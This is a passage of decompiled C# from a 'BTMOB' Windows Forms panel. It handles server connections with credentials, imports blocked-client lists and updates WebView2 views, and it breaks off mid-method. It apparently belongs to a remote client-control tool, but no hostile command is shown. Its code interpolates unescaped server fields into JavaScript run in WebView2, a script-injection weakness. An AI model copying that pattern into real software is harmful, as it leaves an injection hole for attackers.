using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using BTMOB.My;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Web.WebView2.Core;
using Microsoft.Web.WebView2.WinForms;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class Form1 : Form
{
	[ComVisible(true)]
	public class Serversbridge
	{
		[CompilerGenerated]
		internal sealed class _Closure_0024__2_002D0
		{
			public string _0024VB_0024Local_ip;

			public string _0024VB_0024Local_srvid;

			public string _0024VB_0024Local_Servername;

			public string _0024VB_0024Local_ConneKey;

			public string _0024VB_0024Local_Scolor;

			public string _0024VB_0024Local_email;

			public string _0024VB_0024Local_pass;

			public Serversbridge _0024VB_0024Me;

			public _Closure_0024__2_002D0(_Closure_0024__2_002D0 arg0)
			{
				if (arg0 != null)
				{
					_0024VB_0024Local_ip = arg0._0024VB_0024Local_ip;
					_0024VB_0024Local_srvid = arg0._0024VB_0024Local_srvid;
					_0024VB_0024Local_Servername = arg0._0024VB_0024Local_Servername;
					_0024VB_0024Local_ConneKey = arg0._0024VB_0024Local_ConneKey;
					_0024VB_0024Local_Scolor = arg0._0024VB_0024Local_Scolor;
					_0024VB_0024Local_email = arg0._0024VB_0024Local_email;
					_0024VB_0024Local_pass = arg0._0024VB_0024Local_pass;
				}
			}

			[SpecialName]
			internal void _Lambda_0024__0()
			{
				try
				{
					_Closure_0024__2_002D1 arg = default(_Closure_0024__2_002D1);
					_Closure_0024__2_002D1 CS_0024_003C_003E8__locals53 = new _Closure_0024__2_002D1(arg)
					{
						_0024VB_0024NonLocal__0024VB_0024Closure_2 = this,
						_0024VB_0024Local_notavilable = false,
						_0024VB_0024Local_hasdata = false
					};
					if (!codes.IsServerAvailable(_0024VB_0024Local_ip))
					{
						CS_0024_003C_003E8__locals53._0024VB_0024Local_notavilable = true;
					}
					else
					{
						Dictionary<string, string> serverBlockedClients = ServersMgr.GetServerBlockedClients(_0024VB_0024Local_ip);
						if (serverBlockedClients != null && serverBlockedClients.Count > 0)
						{
							foreach (KeyValuePair<string, string> item in serverBlockedClients)
							{
								CS_0024_003C_003E8__locals53._0024VB_0024Local_hasdata = true;
								string key = item.Key;
								string value = item.Value;
								if (!BTEngine.BlockedClients.Contains(value))
								{
									BTEngine.BlockedClients.Add(value);
								}
								if (!BTEngine.BlockedClients.Contains(key))
								{
									BTEngine.BlockedClients.Add(key);
								}
							}
						}
					}
					_0024VB_0024Me.mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						try
						{
							ServersInfo sinfoByip = codes.getSinfoByip(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip);
							if (sinfoByip != null)
							{
								BTAlerter.infos(BTConst.servrcnctedstr);
								CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
							}
							else if (CS_0024_003C_003E8__locals53._0024VB_0024Local_notavilable)
							{
								BTAlerter.erroes(BTConst.srvrntavliblstr + "\r\n" + $" {CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}");
								CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
							}
							else
							{
								if (CS_0024_003C_003E8__locals53._0024VB_0024Local_hasdata)
								{
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ShowBlocksForServer(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername);
								}
								if (CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm == null || CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
								{
									ServersInfo serversInfo = new ServersInfo(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ConneKey, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor);
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = new loader(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_email, CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_pass, serversInfo);
									DialogResult dialogResult = CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.ShowDialog();
									if (dialogResult != DialogResult.OK)
									{
										CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
										if (CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
										{
											CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Remove(serversInfo);
										}
										serversInfo.IsOnline = false;
										serversInfo.Sstate = "offline";
									}
									else
									{
										CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
										if (!CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
										{
											CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Add(serversInfo);
										}
										serversInfo.IsOnline = true;
										serversInfo.Sstate = "online";
										CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.CheckUpdate(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, byuser: false);
										string javaScript = $"addUpdateServer('{CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername}', '{CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor}','{CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}');";
										CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.updateview.CoreWebView2.ExecuteScriptAsync(javaScript);
									}
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
								}
								else
								{
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.BringToFront();
									CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Focus();
								}
							}
						}
						catch (Exception ex2)
						{
							ProjectData.SetProjectError(ex2);
							Exception ex3 = ex2;
							if (CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm != null && CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
							{
								CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
								CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
								CS_0024_003C_003E8__locals53._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
							}
							BTAlerter.erroes(ex3.Message);
							ProjectData.ClearProjectError();
						}
					}));
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					_Closure_0024__2_002D2 arg2 = default(_Closure_0024__2_002D2);
					_Closure_0024__2_002D2 CS_0024_003C_003E8__locals59 = new _Closure_0024__2_002D2(arg2)
					{
						_0024VB_0024NonLocal__0024VB_0024Closure_3 = this
					};
					Exception _0024VB_0024Local_ex = ex;
					CS_0024_003C_003E8__locals59._0024VB_0024Local_ex = _0024VB_0024Local_ex;
					_0024VB_0024Me.mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						if (CS_0024_003C_003E8__locals59._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm != null && CS_0024_003C_003E8__locals59._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.IsDisposed)
						{
							CS_0024_003C_003E8__locals59._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Close();
							CS_0024_003C_003E8__locals59._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Dispose();
							CS_0024_003C_003E8__locals59._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm = null;
						}
						BTAlerter.erroes(CS_0024_003C_003E8__locals59._0024VB_0024Local_ex.Message);
					}));
					ProjectData.ClearProjectError();
				}
			}
		}

		[CompilerGenerated]
		internal sealed class _Closure_0024__2_002D1
		{
			public bool _0024VB_0024Local_notavilable;

			public bool _0024VB_0024Local_hasdata;

			public _Closure_0024__2_002D0 _0024VB_0024NonLocal__0024VB_0024Closure_2;

			public _Closure_0024__2_002D1(_Closure_0024__2_002D1 arg0)
			{
				if (arg0 != null)
				{
					_0024VB_0024Local_notavilable = arg0._0024VB_0024Local_notavilable;
					_0024VB_0024Local_hasdata = arg0._0024VB_0024Local_hasdata;
				}
			}

			[SpecialName]
			internal void _Lambda_0024__1()
			{
				try
				{
					ServersInfo sinfoByip = codes.getSinfoByip(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip);
					if (sinfoByip != null)
					{
						BTAlerter.infos(BTConst.servrcnctedstr);
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
						return;
					}
					if (_0024VB_0024Local_notavilable)
					{
						BTAlerter.erroes(BTConst.srvrntavliblstr + "\r\n" + $" {_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}");
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
						return;
					}
					if (_0024VB_0024Local_hasdata)
					{
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ShowBlocksForServer(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername);
					}
					if (_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm == null || _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
					{
						ServersInfo serversInfo = new ServersInfo(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ConneKey, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor);
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = new loader(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_email, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_pass, serversInfo);
						DialogResult dialogResult = _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.ShowDialog();
						if (dialogResult != DialogResult.OK)
						{
							_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
							if (_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
							{
								_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Remove(serversInfo);
							}
							serversInfo.IsOnline = false;
							serversInfo.Sstate = "offline";
						}
						else
						{
							_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
							if (!_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
							{
								_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Add(serversInfo);
							}
							serversInfo.IsOnline = true;
							serversInfo.Sstate = "online";
							_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.CheckUpdate(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, byuser: false);
							string javaScript = $"addUpdateServer('{_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername}', '{_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor}','{_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}');";
							_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.updateview.CoreWebView2.ExecuteScriptAsync(javaScript);
						}
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
					}
					else
					{
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.BringToFront();
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Focus();
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					if (_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm != null && _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
					{
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
					}
					BTAlerter.erroes(ex2.Message);
					ProjectData.ClearProjectError();
				}
			}
		}

		[CompilerGenerated]
		internal sealed class _Closure_0024__2_002D2
		{
			public Exception _0024VB_0024Local_ex;

			public _Closure_0024__2_002D0 _0024VB_0024NonLocal__0024VB_0024Closure_3;

			public _Closure_0024__2_002D2(_Closure_0024__2_002D2 arg0)
			{
				if (arg0 != null)
				{
					_0024VB_0024Local_ex = arg0._0024VB_0024Local_ex;
				}
			}

			[SpecialName]
			internal void _Lambda_0024__2()
			{
				if (_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm != null && _0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.IsDisposed)
				{
					_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Close();
					_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.Dispose();
					_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm = null;
				}
				BTAlerter.erroes(_0024VB_0024Local_ex.Message);
			}
		}

		[CompilerGenerated]
		internal sealed class _Closure_0024__5_002D0
		{
			public ServersInfo _0024VB_0024Local_srvinfo;

			public string _0024VB_0024Local_srvid;

			public Serversbridge _0024VB_0024Me;

			public _Closure_0024__5_002D0(_Closure_0024__5_002D0 arg0)
			{
				if (arg0 != null)
				{
					_0024VB_0024Local_srvinfo = arg0._0024VB_0024Local_srvinfo;
					_0024VB_0024Local_srvid = arg0._0024VB_0024Local_srvid;
				}
			}

			[SpecialName]
			internal void _Lambda_0024__0()
			{
				try
				{
					_0024VB_0024Me.mainform.AllServers.Remove(_0024VB_0024Local_srvinfo);
					_0024VB_0024Me.mainform.ServerState(_0024VB_0024Local_srvid, isconnected: false);
					_0024VB_0024Me.mainform.stateview.CoreWebView2.ExecuteScriptAsync($"updateServerStatus('{_0024VB_0024Local_srvid}','offline');");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}

		public Form1 mainform;

		public Serversbridge(Form1 minme)
		{
			mainform = minme;
		}

		[DispId(1)]
		public object connecttoserver(string ip, string email, string pass, string ConneKey, string srvid, string Servername, string Scolor)
		{
			_Closure_0024__2_002D0 arg = default(_Closure_0024__2_002D0);
			_Closure_0024__2_002D0 CS_0024_003C_003E8__locals23 = new _Closure_0024__2_002D0(arg);
			CS_0024_003C_003E8__locals23._0024VB_0024Me = this;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_ip = ip;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_email = email;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_pass = pass;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_ConneKey = ConneKey;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_srvid = srvid;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_Servername = Servername;
			CS_0024_003C_003E8__locals23._0024VB_0024Local_Scolor = Scolor;
			Thread thread = new Thread([SpecialName] () =>
			{
				try
				{
					_Closure_0024__2_002D1 arg2 = default(_Closure_0024__2_002D1);
					_Closure_0024__2_002D1 CS_0024_003C_003E8__locals72 = new _Closure_0024__2_002D1(arg2);
					CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2 = CS_0024_003C_003E8__locals23;
					CS_0024_003C_003E8__locals72._0024VB_0024Local_notavilable = false;
					CS_0024_003C_003E8__locals72._0024VB_0024Local_hasdata = false;
					if (!codes.IsServerAvailable(CS_0024_003C_003E8__locals23._0024VB_0024Local_ip))
					{
						CS_0024_003C_003E8__locals72._0024VB_0024Local_notavilable = true;
					}
					else
					{
						Dictionary<string, string> serverBlockedClients = ServersMgr.GetServerBlockedClients(CS_0024_003C_003E8__locals23._0024VB_0024Local_ip);
						if (serverBlockedClients != null && serverBlockedClients.Count > 0)
						{
							foreach (KeyValuePair<string, string> item in serverBlockedClients)
							{
								CS_0024_003C_003E8__locals72._0024VB_0024Local_hasdata = true;
								string key = item.Key;
								string value = item.Value;
								if (!BTEngine.BlockedClients.Contains(value))
								{
									BTEngine.BlockedClients.Add(value);
								}
								if (!BTEngine.BlockedClients.Contains(key))
								{
									BTEngine.BlockedClients.Add(key);
								}
							}
						}
					}
					CS_0024_003C_003E8__locals23._0024VB_0024Me.mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						try
						{
							ServersInfo sinfoByip = codes.getSinfoByip(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip);
							if (sinfoByip != null)
							{
								BTAlerter.infos(BTConst.servrcnctedstr);
								CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
							}
							else if (CS_0024_003C_003E8__locals72._0024VB_0024Local_notavilable)
							{
								BTAlerter.erroes(BTConst.srvrntavliblstr + "\r\n" + $" {CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}");
								CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
							}
							else
							{
								if (CS_0024_003C_003E8__locals72._0024VB_0024Local_hasdata)
								{
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ShowBlocksForServer(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername);
								}
								if (CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm == null || CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
								{
									ServersInfo serversInfo = new ServersInfo(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ConneKey, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor);
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = new loader(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_email, CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_pass, serversInfo);
									DialogResult dialogResult = CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.ShowDialog();
									if (dialogResult != DialogResult.OK)
									{
										CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
										if (CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
										{
											CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Remove(serversInfo);
										}
										serversInfo.IsOnline = false;
										serversInfo.Sstate = "offline";
									}
									else
									{
										CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: true);
										if (!CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Contains(serversInfo))
										{
											CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.AllServers.Add(serversInfo);
										}
										serversInfo.IsOnline = true;
										serversInfo.Sstate = "online";
										CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.CheckUpdate(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip, byuser: false);
										string javaScript = $"addUpdateServer('{CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Servername}', '{CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_Scolor}','{CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ip}');";
										CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.updateview.CoreWebView2.ExecuteScriptAsync(javaScript);
									}
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
								}
								else
								{
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.ServerState(CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srvid, isconnected: false);
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.BringToFront();
									CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Focus();
								}
							}
						}
						catch (Exception ex2)
						{
							ProjectData.SetProjectError(ex2);
							Exception ex3 = ex2;
							if (CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm != null && CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.IsDisposed)
							{
								CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Close();
								CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm.Dispose();
								CS_0024_003C_003E8__locals72._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Me.mainform.lodForm = null;
							}
							BTAlerter.erroes(ex3.Message);
							ProjectData.ClearProjectError();
						}
					}));
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					_Closure_0024__2_002D2 arg3 = default(_Closure_0024__2_002D2);
					_Closure_0024__2_002D2 CS_0024_003C_003E8__locals78 = new _Closure_0024__2_002D2(arg3);
					CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3 = CS_0024_003C_003E8__locals23;
					Exception _0024VB_0024Local_ex = ex;
					CS_0024_003C_003E8__locals78._0024VB_0024Local_ex = _0024VB_0024Local_ex;
					CS_0024_003C_003E8__locals23._0024VB_0024Me.mainform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						if (CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm != null && CS_0024_003C_003E8__locals78._0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Me.mainform.lodForm.IsDisposed)
						{
